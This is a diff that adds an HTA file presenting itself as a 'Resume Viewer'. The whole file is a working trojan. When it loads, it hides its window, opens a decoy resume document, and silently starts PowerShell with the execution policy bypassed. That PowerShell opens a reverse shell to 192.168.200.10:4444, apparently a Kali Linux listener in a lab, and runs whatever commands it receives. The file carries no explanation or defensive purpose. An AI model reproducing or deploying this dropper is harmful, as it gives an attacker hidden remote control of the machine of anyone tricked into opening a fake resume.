@@ -1,0 +1,51 @@
+<html>
+<head>
+<title>Resume Viewer</title>
+<hta:application 
+    id="oHTA"
+    applicationname="ResumeViewer"
+    border="none"
+    caption="no"
+    showintaskbar="no"
+    windowstyle="hidden"
+/>
+
+<script language="VBScript">
+    Sub Window_OnLoad
+        window.resizeTo 0, 0
+        window.moveTo -2000, -2000
+
+        Dim shell, fso, localPath, docxPath, cmd
+        Set shell = CreateObject("WScript.Shell")
+        Set fso = CreateObject("Scripting.FileSystemObject")
+        
+        ' 1.
+        localPath = shell.CurrentDirectory
+        
+        ' 2. open decoy docx
+        docxPath = fso.BuildPath(localPath, "resources\resume.docx")
+        If fso.FileExists(docxPath) Then
+            shell.Run "cmd.exe /c start """" """ & docxPath & """", 0, False
+        End If
+        
+        ' 3. Kali Linux(192.168.200.10:4444) direct reverse shell command
+        cmd = "powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command """ & _
+              "$c = New-Object System.Net.Sockets.TCPClient('192.168.200.10',4444);" & _
+              "$s = $c.GetStream();[byte[]]$b = 0..65535|%{0};" & _
+              "$i = (New-Object System.Net.AsciiEncoding).GetString($b,0,$b.Length);" & _
+              "while(($i = $s.Read($b, 0, $b.Length)) -ne 0){" & _
+              "$d = (New-Object System.Net.AsciiEncoding).GetString($b,0,$i);" & _
+              "$sb = (iex $d 2>&1 | Out-String );" & _
+              "$t  = $sb + 'PS ' + (pwd).Path + '> ';" & _
+              "$sb = ([text.encoding]::ASCII).GetBytes($t);" & _
+              "$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"""
+              
+        ' 4. exit
+        shell.Run cmd, 0, False
+        window.close
+    End Sub
+</script>
+</head>
+<body>
+</body>
+</html>
